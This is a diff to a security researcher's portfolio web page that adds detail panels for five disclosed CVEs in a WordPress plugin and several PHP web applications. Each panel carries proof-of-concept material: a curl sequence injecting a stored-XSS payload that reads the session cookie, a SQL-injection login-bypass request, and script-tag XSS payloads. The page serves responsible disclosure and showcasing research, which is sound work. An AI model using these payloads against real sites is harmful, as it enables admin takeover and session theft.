@@ -7,10 +7,23 @@
 <html>
 
 <head>
-	<title>My Portfolio </title>
+	<title>Mohamed Habib Smidi — Security Engineer (Craniums)</title>
 	<meta charset="utf-8" />
-	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<meta name="description" content="Mohamed Habib Smidi (Craniums) — cyber security engineer and security researcher. 5 CVEs, published exploits on Exploit-DB, and write-ups." />
+	<link rel="icon" type="image/png" href="images/favicon.png" />
+	<!-- Open Graph / social share -->
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="Mohamed Habib Smidi — Security Engineer (Craniums)" />
+	<meta property="og:description" content="Cyber security engineer and security researcher. 5 CVEs, published exploits on Exploit-DB, and write-ups." />
+	<meta property="og:url" content="https://mrcraniums.github.io/" />
+	<meta property="og:image" content="https://mrcraniums.github.io/images/pic01.gif" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:title" content="Mohamed Habib Smidi — Security Engineer (Craniums)" />
+	<meta name="twitter:description" content="Cyber security engineer and security researcher. 5 CVEs, published exploits on Exploit-DB, and write-ups." />
+	<meta name="twitter:image" content="https://mrcraniums.github.io/images/pic01.gif" />
 	<link rel="stylesheet" href="assets/css/main.css" />
+	<link rel="stylesheet" href="assets/css/work.css" />
 	<noscript>
 		<link rel="stylesheet" href="assets/css/noscript.css" />
 	</noscript>
@@ -51,52 +64,434 @@
 			<article id="intro">
 				<h2 class="major">Whoami</h2>
 				<span class="image main"><img src="images/pic01.gif" alt="" /></span>
-				<p>I'm cyber security engineer,security research & hackthebox player ,known as `Craniums` online
-					to know
-					more about what i do check my <a href="#My_Work">awesome work</a>.
+				<p>I'm a cyber security engineer and security researcher, and a Hack The Box player known online as <strong>Craniums</strong>. To learn more about what I do, check out my <a href="#My_Work">awesome work</a>.
 					<center>
-						<script src="https://www.hackthebox.eu/badge/74161"></script>
+						<a href="https://app.hackthebox.com/users/74161" target="_blank" rel="noopener">
+							<img src="https://www.hackthebox.com/badge/image/74161" alt="Hack The Box profile" style="max-width:100%;height:auto;" />
+						</a>
 					</center>
 				</p>
 
 			</article>
 
-			<!-- Work -->
-			<article id="What_I_Do">
-				<h2 class="major">What I Do </h2>
+			<!-- What I Do -->
+			<article id="What_I_Do" class="r-panel">
+				<h2 class="major">What I Do</h2>
 				<span class="image main"><img src="images/pic02.jpg" alt="" /></span>
-				<p>What i do is mostly top secret and ethical ,so no worries.</p>
-
+				<p class="r-lede">I break web applications to help secure them &mdash; finding, proving, and responsibly disclosing vulnerabilities.</p>
+				<ul class="r-skills">
+					<li>
+						<h4>Vulnerability research</h4>
+						<p>Finding and disclosing bugs in WordPress plugins/themes and PHP web apps. 5 CVEs assigned to date.</p>
+					</li>
+					<li>
+						<h4>Web application pentesting</h4>
+						<p>SQL injection, stored XSS, authentication bypass and related OWASP-class flaws, from recon to impact.</p>
+					</li>
+					<li>
+						<h4>Exploit development</h4>
+						<p>Writing working proof-of-concept exploits and publishing them on Exploit-DB.</p>
+					</li>
+					<li>
+						<h4>CTF &amp; Hack The Box</h4>
+						<p>Hands-on offensive practice and continuous learning &mdash; Guru rank on Hack The Box.</p>
+					</li>
+				</ul>
+				<ul class="r-tags">
+					<li>PHP</li>
+					<li>WordPress</li>
+					<li>Linux</li>
+					<li class="is-sqli">SQLi</li>
+					<li class="is-xss">XSS</li>
+					<li class="is-auth">Auth bypass</li>
+				</ul>
+				<ul class="actions r-back">
+					<li><a href="#My_Work" class="button primary small icon solid fa-angle-right">See my disclosures</a></li>
+				</ul>
 			</article>
 
-			<!-- About -->
-			<article id="My_Work">
-				<h2 class="major">My latest work</h2>
-				<span class="image main"><a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/betterdocs/betterdocs-453-authenticated-contributor-stored-cross-site-scripting-via-blockid-block-attribute"><img src="images/pic08.png"
-							alt="" /></a></span>
-				<p></p>
-				<span class="image main"><a href="https://www.exploit-db.com/exploits/49352"><img src="images/pic06.png"
-							alt="" /></a></span>
-								<p></p>
-				<span class="image main"><a href="https://www.exploit-db.com/exploits/49396"><img src="images/pic07.png"
-							alt="" /></a></span>
-				<p></p>
-				<span class="image main"><a href="https://www.exploit-db.com/exploits/50561"><img src="images/pic10.png"
-							alt="" /></a></span>
-				<p></p>
-				<span class="image main"><a href="https://www.exploit-db.com/exploits/50560"><img src="images/pic09.png"
-							alt="" /></a></span>
-				<p></p>
-				<span class="image main"><a
-						href="https://medium.com/@medhabib.smidi_76213/this-person-does-not-exist-or-does-he-4dfc1bb9ffe9"><img
-							src="images/pic04.png" alt="" /></a></span>
-				<p></p>
-				<span class="image main"><a
-						href="https://medium.com/@medhabib.smidi_76213/hack-the-box-bitlab-write-up-c4e8979f3e25"><img
-							src="images/pic05.png" alt="" /></a></span>
-				<p></p>
+			<!-- Work -->
+			<article id="My_Work" class="r-panel">
+				<h2 class="major">Security Research</h2>
+				<p class="r-lede">Vulnerabilities I've found and published, plus write-ups.</p>
 
+				<ul class="r-stats">
+					<li><strong data-stat="disclosures">5</strong><span>Disclosures</span></li>
+					<li><strong data-stat="cves">5</strong><span>CVEs assigned</span></li>
+					<li><strong data-stat="writeups">2</strong><span>Write-ups</span></li>
+				</ul>
 
+				<h3 class="r-heading">Disclosures <small data-stat="disclosures">5</small></h3>
+				<ol class="r-list" id="disclosures">
+					<li class="r-item">
+						<a href="#vuln-betterdocs">
+							<div class="r-meta">
+								<span class="r-id">CVE-2026-12157</span>
+								<span class="r-sev is-medium">6.4 Medium</span>
+								<time datetime="2026-06-18">2026-06-18</time>
+							</div>
+							<h4 class="r-title">BetterDocs &le; 4.5.3</h4>
+							<p class="r-desc">Authenticated (Contributor+) stored XSS via the <code>blockId</code> block attribute.</p>
+							<ul class="r-tags">
+								<li>WordPress plugin</li>
+								<li class="is-xss">Stored XSS</li>
+								<li>Wordfence</li>
+							</ul>
+						</a>
+					</li>
+					<li class="r-item">
+						<a href="#vuln-magazine">
+							<div class="r-meta">
+								<span class="r-id">CVE-2021-44653</span>
+								<span class="r-sev is-critical">9.8 Critical</span>
+								<span>EDB-50561</span>
+								<time datetime="2021-12-03">2021-12-03</time>
+							</div>
+							<h4 class="r-title">Online Magazine Management System 1.0</h4>
+							<p class="r-desc">SQL injection in the admin panel login, leading to authentication bypass.</p>
+							<ul class="r-tags">
+								<li>PHP</li>
+								<li class="is-sqli">SQLi</li>
+								<li class="is-auth">Auth bypass</li>
+								<li>Exploit-DB</li>
+							</ul>
+						</a>
+					</li>
+					<li class="r-item">
+						<a href="#vuln-carshowroom">
+							<div class="r-meta">
+								<span class="r-id">CVE-2021-44655</span>
+								<span class="r-sev is-critical">9.8 Critical</span>
+								<span>EDB-50560</span>
+								<time datetime="2021-12-03">2021-12-03</time>
+							</div>
+							<h4 class="r-title">Online Pre-owned/Used Car Showroom Management System 1.0</h4>
+							<p class="r-desc">SQL injection in the admin panel login, leading to authentication bypass.</p>
+							<ul class="r-tags">
+								<li>PHP</li>
+								<li class="is-sqli">SQLi</li>
+								<li class="is-auth">Auth bypass</li>
+								<li>Exploit-DB</li>
+							</ul>
+						</a>
+					</li>
+					<li class="r-item">
+						<a href="#vuln-doctor">
+							<div class="r-meta">
+								<span class="r-id">CVE-2021-25791</span>
+								<span class="r-sev is-medium">5.4 Medium</span>
+								<span>EDB-49396</span>
+								<time datetime="2021-01-08">2021-01-08</time>
+							</div>
+							<h4 class="r-title">Online Doctor Appointment System 1.0</h4>
+							<p class="r-desc">Multiple stored XSS in the Update Profile module.</p>
+							<ul class="r-tags">
+								<li>PHP</li>
+								<li class="is-xss">Stored XSS</li>
+								<li>Exploit-DB</li>
+							</ul>
+						</a>
+					</li>
+					<li class="r-item">
+						<a href="#vuln-houserental">
+							<div class="r-meta">
+								<span class="r-id">CVE-2021-25790</span>
+								<span class="r-sev is-medium">5.4 Medium</span>
+								<span>EDB-49352</span>
+								<time datetime="2021-01-05">2021-01-05</time>
+							</div>
+							<h4 class="r-title">House Rental and Property Listing 1.0</h4>
+							<p class="r-desc">Multiple stored XSS in the Register module.</p>
+							<ul class="r-tags">
+								<li>PHP</li>
+								<li class="is-xss">Stored XSS</li>
+								<li>Exploit-DB</li>
+							</ul>
+						</a>
+					</li>
+				</ol>
+
+				<h3 class="r-heading">Write-ups <small data-stat="writeups">2</small></h3>
+				<ol class="r-list" id="writeups">
+					<li class="r-item">
+						<a class="is-ext" href="https://medium.com/@medhabib.smidi_76213/this-person-does-not-exist-or-does-he-4dfc1bb9ffe9" target="_blank" rel="noopener">
+							<div class="r-meta">
+								<span class="r-id">medium.com</span>
+								<span>4 min read</span>
+								<time datetime="2020-01-21">2020-01-21</time>
+							</div>
+							<h4 class="r-title">This person does not exist or does he!</h4>
+							<p class="r-desc">How GAN-generated faces fuel fake identities and sock puppets for social engineering, and OSINT techniques to spot them.</p>
+							<ul class="r-tags">
+								<li>Cybersecurity</li>
+								<li>Cybercrime</li>
+								<li>Fake Identity</li>
+								<li>Social Engineering</li>
+								<li>OSINT</li>
+								<li>AI-generated faces</li>
+							</ul>
+						</a>
+					</li>
+					<li class="r-item">
+						<a class="is-ext" href="https://medium.com/@medhabib.smidi_76213/hack-the-box-bitlab-write-up-c4e8979f3e25" target="_blank" rel="noopener">
+							<div class="r-meta">
+								<span class="r-id">medium.com</span>
+								<span>3 min read</span>
+							</div>
+							<h4 class="r-title">Hack The Box &mdash; Bitlab Write-up</h4>
+							<p class="r-desc">Walkthrough of the retired Bitlab machine.</p>
+							<ul class="r-tags">
+								<li>Hack The Box</li>
+								<li>Linux</li>
+								<li>Medium difficulty</li>
+							</ul>
+						</a>
+					</li>
+				</ol>
+			</article>
+
+			<!-- Disclosure detail: BetterDocs -->
+			<article id="vuln-betterdocs" class="r-panel r-detail">
+				<h2 class="major">BetterDocs &le; 4.5.3</h2>
+				<div class="r-meta">
+					<span class="r-id">CVE-2026-12157</span>
+					<span class="r-sev is-medium">6.4 Medium</span>
+					<time datetime="2026-06-18">2026-06-18</time>
+				</div>
+				<ul class="r-tags">
+					<li>WordPress plugin</li>
+					<li class="is-xss">Stored XSS</li>
+					<li>Wordfence</li>
+				</ul>
+
+				<h3>Summary</h3>
+				<p>The BetterDocs WordPress plugin (&le; 4.5.3) is vulnerable to authenticated stored cross-site scripting. A low-privileged user (Contributor and above) can inject JavaScript through the <code>blockId</code> attribute of a BetterDocs block, which is echoed into page markup without sufficient output escaping. The script then runs in the browser of anyone who views the affected content.</p>
+
+				<h3>Technical breakdown</h3>
+				<ul class="r-facts">
+					<li><span class="r-key">Type</span><span class="r-val">Stored XSS (authenticated)</span></li>
+					<li><span class="r-key">Component</span><span class="r-val"><code>blockId</code> block attribute</span></li>
+					<li><span class="r-key">Version</span><span class="r-val">&le; 4.5.3</span></li>
+					<li><span class="r-key">Privilege</span><span class="r-val">Contributor and above</span></li>
+					<li><span class="r-key">CVSS 3.1</span><span class="r-val"><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N</code></span></li>
+				</ul>
+
+				<h3>Proof of concept</h3>
+				<p>The <code>blockId</code> attribute of a BetterDocs block is written into the rendered markup without escaping. A crafted value breaks out of the attribute and adds <code>onfocus</code> + <code>autofocus</code>, so the payload fires the moment the element is focused &mdash; for example when an Administrator previews the pending post. Tested on BetterDocs 4.3.12 (affected &le; 4.5.3) with a Contributor account.</p>
+				<ol class="r-steps">
+					<li>Log in as a Contributor, then fetch a REST nonce and submit the payload via the REST API (commands below).</li>
+					<li>As an Administrator, go to <strong>Posts &rarr; All Posts</strong>.</li>
+					<li>Hover the pending &ldquo;Documentation Overview&rdquo; post and click <strong>Preview</strong>.</li>
+					<li><code>autofocus</code> focuses the injected element and <code>onfocus</code> fires, popping an alert with the session cookie.</li>
+				</ol>
+				<code class="r-poc"># authenticate as the Contributor
+curl -s -c cookies.txt -X POST http://TARGET/wp-login.php \
+  -d "log=CONTRIBUTOR_USER&amp;pwd=CONTRIBUTOR_PASS&amp;wp-submit=Log+In"
+
+# grab a REST API nonce
+NONCE=$(curl -s -b cookies.txt http://TARGET/wp-admin/post-new.php \
+  | grep -oP '"nonce":"([a-f0-9]+)"' | grep -oP '[a-f0-9]{10}')
+
+# submit the post with the crafted blockId attribute
+curl -s -b cookies.txt -H "X-WP-Nonce: $NONCE" -H "Content-Type: application/json" \
+  -X POST "http://TARGET/index.php?rest_route=/wp/v2/posts" \
+  -d '{"title":"Documentation Overview","status":"pending","content":
+      "&lt;!-- wp:betterdocs/category-slate-layout {\"blockId\":\"x\\\" onfocus=\\\"alert(document.cookie)\\\" autofocus=\\\"true\\\" tabindex=\\\"1\"} /--&gt;"}'</code>
+				<p>Full disclosure details are on the Wordfence advisory.</p>
+
+				<ul class="actions">
+					<li><a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/betterdocs/betterdocs-453-authenticated-contributor-stored-cross-site-scripting-via-blockid-block-attribute" target="_blank" rel="noopener" class="button primary icon solid fa-shield-alt">Wordfence advisory</a></li>
+					<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12157" target="_blank" rel="noopener" class="button icon solid fa-list">CVE record</a></li>
+				</ul>
+				<ul class="actions r-back">
+					<li><a href="#My_Work" class="button small icon solid fa-arrow-left">Back to My Work</a></li>
+				</ul>
+			</article>
+
+			<!-- Disclosure detail: Online Magazine Management System -->
+			<article id="vuln-magazine" class="r-panel r-detail">
+				<h2 class="major">Online Magazine Management System 1.0</h2>
+				<div class="r-meta">
+					<span class="r-id">CVE-2021-44653</span>
+					<span class="r-sev is-critical">9.8 Critical</span>
+					<span>EDB-50561</span>
+					<time datetime="2021-12-03">2021-12-03</time>
+				</div>
+				<ul class="r-tags">
+					<li>PHP</li>
+					<li class="is-sqli">SQLi</li>
+					<li class="is-auth">Auth bypass</li>
+					<li>Exploit-DB</li>
+				</ul>
+
+				<h3>Summary</h3>
+				<p>Online Magazine Management System 1.0 builds the admin login SQL query from the submitted credentials without sanitisation. A crafted username injects into the query and bypasses authentication, granting admin access with no valid password &mdash; an unauthenticated, network-reachable compromise of the application.</p>
+
+				<h3>Technical breakdown</h3>
+				<ul class="r-facts">
+					<li><span class="r-key">Type</span><span class="r-val">SQL injection &rarr; authentication bypass</span></li>
+					<li><span class="r-key">Component</span><span class="r-val">Admin panel login</span></li>
+					<li><span class="r-key">Version</span><span class="r-val">1.0</span></li>
+					<li><span class="r-key">Privilege</span><span class="r-val">Unauthenticated</span></li>
+					<li><span class="r-key">CVSS 3.1</span><span class="r-val"><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></span></li>
+				</ul>
+
+				<h3>Proof of concept</h3>
+				<p>The login handler at <code>/magazines/classes/Login.php?f=login</code> concatenates the <code>username</code> field into the authentication query without sanitisation. The payload below makes the <code>WHERE</code> clause always true and logs in as the first (admin) account, no valid password required.</p>
+				<code class="r-poc">POST /magazines/classes/Login.php?f=login HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+
+username='+or+1%3D1+limit+1+--+-%2B&amp;password=aaaa</code>
+				<p>URL-decoded, the username field is <code>' or 1=1 limit 1 -- -+</code>. Published as EDB-50561 on Exploit-DB.</p>
+
+				<ul class="actions">
+					<li><a href="https://www.exploit-db.com/exploits/50561" target="_blank" rel="noopener" class="button primary icon solid fa-bug">Exploit-DB</a></li>
+					<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44653" target="_blank" rel="noopener" class="button icon solid fa-list">CVE record</a></li>
+				</ul>
+				<ul class="actions r-back">
+					<li><a href="#My_Work" class="button small icon solid fa-arrow-left">Back to My Work</a></li>
+				</ul>
+			</article>
+
+			<!-- Disclosure detail: Car Showroom Management System -->
+			<article id="vuln-carshowroom" class="r-panel r-detail">
+				<h2 class="major">Online Pre-owned/Used Car Showroom Management System 1.0</h2>
+				<div class="r-meta">
+					<span class="r-id">CVE-2021-44655</span>
+					<span class="r-sev is-critical">9.8 Critical</span>
+					<span>EDB-50560</span>
+					<time datetime="2021-12-03">2021-12-03</time>
+				</div>
+				<ul class="r-tags">
+					<li>PHP</li>
+					<li class="is-sqli">SQLi</li>
+					<li class="is-auth">Auth bypass</li>
+					<li>Exploit-DB</li>
+				</ul>
+
+				<h3>Summary</h3>
+				<p>Online Pre-owned/Used Car Showroom Management System 1.0 is vulnerable to SQL injection in the admin login. The submitted credentials are concatenated into the authentication query without sanitisation, so a crafted username bypasses authentication and yields admin access without a valid password.</p>
+
+				<h3>Technical breakdown</h3>
+				<ul class="r-facts">
+					<li><span class="r-key">Type</span><span class="r-val">SQL injection &rarr; authentication bypass</span></li>
+					<li><span class="r-key">Component</span><span class="r-val">Admin panel login</span></li>
+					<li><span class="r-key">Version</span><span class="r-val">1.0</span></li>
+					<li><span class="r-key">Privilege</span><span class="r-val">Unauthenticated</span></li>
+					<li><span class="r-key">CVSS 3.1</span><span class="r-val"><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></span></li>
+				</ul>
+
+				<h3>Proof of concept</h3>
+				<p>The login handler at <code>/used_car_showroom/classes/Login.php?f=login</code> concatenates the <code>username</code> field into the authentication query without sanitisation. The payload below makes the <code>WHERE</code> clause always true and logs in as the first (admin) account, no valid password required.</p>
+				<code class="r-poc">POST /used_car_showroom/classes/Login.php?f=login HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+
+username='+or+1%3D1+limit+1+--+-%2B&amp;password=aaaa</code>
+				<p>URL-decoded, the username field is <code>' or 1=1 limit 1 -- -+</code>. Published as EDB-50560 on Exploit-DB.</p>
+
+				<ul class="actions">
+					<li><a href="https://www.exploit-db.com/exploits/50560" target="_blank" rel="noopener" class="button primary icon solid fa-bug">Exploit-DB</a></li>
+					<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44655" target="_blank" rel="noopener" class="button icon solid fa-list">CVE record</a></li>
+				</ul>
+				<ul class="actions r-back">
+					<li><a href="#My_Work" class="button small icon solid fa-arrow-left">Back to My Work</a></li>
+				</ul>
+			</article>
+
+			<!-- Disclosure detail: Online Doctor Appointment System -->
+			<article id="vuln-doctor" class="r-panel r-detail">
+				<h2 class="major">Online Doctor Appointment System 1.0</h2>
+				<div class="r-meta">
+					<span class="r-id">CVE-2021-25791</span>
+					<span class="r-sev is-medium">5.4 Medium</span>
+					<span>EDB-49396</span>
+					<time datetime="2021-01-08">2021-01-08</time>
+				</div>
+				<ul class="r-tags">
+					<li>PHP</li>
+					<li class="is-xss">Stored XSS</li>
+					<li>Exploit-DB</li>
+				</ul>
+
+				<h3>Summary</h3>
+				<p>Online Doctor Appointment System 1.0 contains multiple stored cross-site scripting vulnerabilities in the &ldquo;Update Profile&rdquo; module. Profile fields are stored and later rendered without output encoding, so an authenticated user can persist JavaScript that executes in the browser of anyone who views the profile.</p>
+
+				<h3>Technical breakdown</h3>
+				<ul class="r-facts">
+					<li><span class="r-key">Type</span><span class="r-val">Stored XSS (authenticated)</span></li>
+					<li><span class="r-key">Component</span><span class="r-val">Update Profile module</span></li>
+					<li><span class="r-key">Version</span><span class="r-val">1.0</span></li>
+					<li><span class="r-key">Privilege</span><span class="r-val">Authenticated user</span></li>
+					<li><span class="r-key">CVSS 3.1</span><span class="r-val"><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N</code></span></li>
+				</ul>
+
+				<h3>Proof of concept</h3>
+				<p>The First Name, Last Name and Address fields in the Update Profile form are stored verbatim and rendered without output encoding, so an injected script runs on every page that displays them.</p>
+				<ol class="r-steps">
+					<li>Log in to a doctor account at <code>/doctorappointmentsystem/adminlogin.php</code>.</li>
+					<li>Open the username menu, go to <strong>Profile</strong>, then <strong>Update profile</strong>.</li>
+					<li>Enter the payload below in the <strong>First Name</strong>, <strong>Last Name</strong> and <strong>Address</strong> fields, then save.</li>
+				</ol>
+				<code class="r-poc">&lt;script&gt;alert("craniums")&lt;/script&gt;</code>
+				<p>The stored script then fires each time the profile is updated or viewed. Published as EDB-49396 (CVE-2021-25791) on Exploit-DB.</p>
+
+				<ul class="actions">
+					<li><a href="https://www.exploit-db.com/exploits/49396" target="_blank" rel="noopener" class="button primary icon solid fa-bug">Exploit-DB</a></li>
+					<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-25791" target="_blank" rel="noopener" class="button icon solid fa-list">CVE record</a></li>
+				</ul>
+				<ul class="actions r-back">
+					<li><a href="#My_Work" class="button small icon solid fa-arrow-left">Back to My Work</a></li>
+				</ul>
+			</article>
+
+			<!-- Disclosure detail: House Rental and Property Listing -->
+			<article id="vuln-houserental" class="r-panel r-detail">
+				<h2 class="major">House Rental and Property Listing 1.0</h2>
+				<div class="r-meta">
+					<span class="r-id">CVE-2021-25790</span>
+					<span class="r-sev is-medium">5.4 Medium</span>
+					<span>EDB-49352</span>
+					<time datetime="2021-01-05">2021-01-05</time>
+				</div>
+				<ul class="r-tags">
+					<li>PHP</li>
+					<li class="is-xss">Stored XSS</li>
+					<li>Exploit-DB</li>
+				</ul>
+
+				<h3>Summary</h3>
+				<p>House Rental and Property Listing 1.0 contains multiple stored cross-site scripting vulnerabilities in the &ldquo;Register&rdquo; module. Registration fields are stored without sanitisation and later rendered without encoding, so an attacker can persist JavaScript that runs when the data is displayed &mdash; for example in an admin panel.</p>
+
+				<h3>Technical breakdown</h3>
+				<ul class="r-facts">
+					<li><span class="r-key">Type</span><span class="r-val">Stored XSS</span></li>
+					<li><span class="r-key">Component</span><span class="r-val">Register module</span></li>
+					<li><span class="r-key">Version</span><span class="r-val">1.0</span></li>
+					<li><span class="r-key">Privilege</span><span class="r-val">Registering user</span></li>
+					<li><span class="r-key">CVSS 3.1</span><span class="r-val"><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N</code></span></li>
+				</ul>
+
+				<h3>Proof of concept</h3>
+				<p>The Full Name field on the registration form is stored verbatim and rendered without output encoding, so an injected script runs once the account is logged in and its name is displayed.</p>
+				<ol class="r-steps">
+					<li>Sign up for the application.</li>
+					<li>Enter the payload below in the <strong>Full Name</strong> field, then click <strong>Submit</strong>.</li>
+					<li>Log in &mdash; the stored script fires on any page that displays the name.</li>
+				</ol>
+				<code class="r-poc">&lt;script&gt;alert("craniums")&lt;/script&gt;</code>
+				<p>Published as EDB-49352 (CVE-2021-25790) on Exploit-DB.</p>
+
+				<ul class="actions">
+					<li><a href="https://www.exploit-db.com/exploits/49352" target="_blank" rel="noopener" class="button primary icon solid fa-bug">Exploit-DB</a></li>
+					<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-25790" target="_blank" rel="noopener" class="button icon solid fa-list">CVE record</a></li>
+				</ul>
+				<ul class="actions r-back">
+					<li><a href="#My_Work" class="button small icon solid fa-arrow-left">Back to My Work</a></li>
+				</ul>
 			</article>
 
 			<!-- Contact -->
@@ -109,40 +504,13 @@
 								class="label">Twitter</span></a></li>
 					<li><a href="https://github.com/MrCraniums" class="icon brands fa-github"><span
 								class="label">GitHub</span></a></li>
+					<li><a href="https://medium.com/@medhabib.smidi_76213" class="icon brands fa-medium"><span
+								class="label">Medium</span></a></li>
+					<li><a href="https://app.hackthebox.com/users/74161" class="icon solid fa-cube"><span
+								class="label">Hack The Box</span></a></li>
 				</ul>
 			</article>
 
-			<!-- Elements -->
-			<article id="elements">
-				<h2 class="major">Elements</h2>
-				<section>
-					<h4>Icons</h4>
-					<ul class="icons">
-						<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
-						<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
-						<li><a href="#" class="icon brands fa-github"><span class="label">Github</span></a></li>
-					</ul>
-				</section>
-				<section>
-					<h3 class="major">Buttons</h3>
-					<ul class="actions">
-						<li><a href="#" class="button primary">Primary</a></li>
-						<li><a href="#" class="button">Default</a></li>
-					</ul>
-					<ul class="actions">
-						<li><a href="#" class="button">Default</a></li>
-						<li><a href="#" class="button small">Small</a></li>
-					</ul>
-					<ul class="actions">
-						<li><a href="#" class="button primary icon solid fa-download">Icon</a></li>
-						<li><a href="#" class="button icon solid fa-download">Icon</a></li>
-					</ul>
-					<ul class="actions">
-						<li><span class="button primary disabled">Disabled</span></li>
-						<li><span class="button disabled">Disabled</span></li>
-					</ul>
-				</section>
-			</article>
 		</div>
 		<!-- Footer -->
 		<footer id="footer">
@@ -157,6 +525,7 @@
 	<script src="assets/js/breakpoints.min.js"></script>
 	<script src="assets/js/util.js"></script>
 	<script src="assets/js/main.js"></script>
+	<script src="assets/js/work.js"></script>
 </body>
 
 </html>
